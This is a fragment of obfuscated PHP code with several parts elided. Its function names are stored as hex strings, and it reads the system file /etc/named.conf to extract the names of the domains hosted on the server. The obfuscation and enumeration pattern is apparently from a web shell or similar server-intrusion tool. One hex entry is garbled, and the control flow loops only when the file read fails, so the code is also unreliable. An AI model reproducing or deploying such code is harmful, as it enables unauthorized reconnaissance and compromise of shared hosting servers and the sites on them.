...
$a =   [
        ...
        "66696C655F7075745F636F6E7z4656E7473", # [4]
        ...
        "66696C65", # [37]
        "707265675F6D617463685F616C6C", # [38]
        "666C757368", # [39]
        "7472696D" # [40]
    ];
...
$d0mains = @$f[37]("/etc/named.conf", false);
if (!$d0mains){
	...
	foreach ($d0mains as $d0main){
		if (@strstr($d0main, "zone")){
			$f[38]('#zone "(.*)"#', $d0main, $domains);
			$f[39]();
			if (strlen($f[40]($domains[1][0])) > 2){
				$f[39]();
				$count++;
			}
		}
